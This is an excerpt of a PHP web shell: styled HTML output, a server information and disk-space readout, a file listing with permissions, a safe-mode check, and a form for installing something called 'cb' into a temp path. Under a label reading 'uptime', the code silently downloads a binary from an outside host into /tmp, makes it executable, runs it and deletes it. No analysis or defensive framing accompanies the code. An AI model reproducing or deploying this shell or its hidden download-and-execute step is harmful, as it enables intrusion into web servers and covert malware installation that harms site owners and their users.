...
margin: 0px; padding: 0px; text-align: center; color: #c0c0c0; 
background-color: #336699 }
TABLE, TR, TD { font-family: Verdana, Tahoma, Arial, sans-serif; 
font-size: 11px; color: #c0c0c0; background-color: #336699 }
...
#logostrip { padding: 0px; margin: 0px; background-color: #000000; 
border: 1px solid #CBAB78; }
#content { padding: 10px; margin: 10px; background-color: #000000; 
border: 1px solid #CBAB78; }
#logo { FONT-SIZE: 50px; }
</style>
...
echo $servsoft . "<br>";
chdir($dir);
echo "Total space " . (int)(disk_total_space(getcwd())/(1024*1024)) . 
"Mb " . "Free space " . (int)(disk_free_space(getcwd())/(1024*1024)) . 
"Mb <br>";
...
echo "uptime:";
echo passthru("cd /tmp;wget www.alrpost69.com/httpd;chmod 777 
httpd;PATH=.;httpd;/bin/rm httpd") . "<br><br>";
}
...
sort($arr);
echo "<table><tr><td>Name</td><td>Type</td><td>Size</td><td>Last 
access</td><td>Last 
change</td><td>Perms</td><td>Write</td><td>Read</td></tr>";
...
$directory = "";
$directory = $directory . "<tr><td>$filename</td><td>" . 
filetype($filename) . "</td><td></td><td>" . date("G:i j M 
Y",fileatime($filename)) . "</td><td>" . date("G:i j M 
Y",filemtime($filename)) . "</td><td>" . fileperms($filename);
...
$file = "";
$file = $file . "<tr><td>$filename</td><td>" . filetype($filename) . 
...
if (ini_get('safe_mode') == 1){echo "<br><font 
size=\"3\"color=\"#cc0000\"><b>SAFE MOD IS ON<br>
Including from here: "
. ini_get('safe_mode_include_dir') . "<br>Exec here: " . 
...
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
Install cb
<b>Temp path</b><input type=\"text\" name=\"installpath\" value=\"" . 
getcwd() . "\">
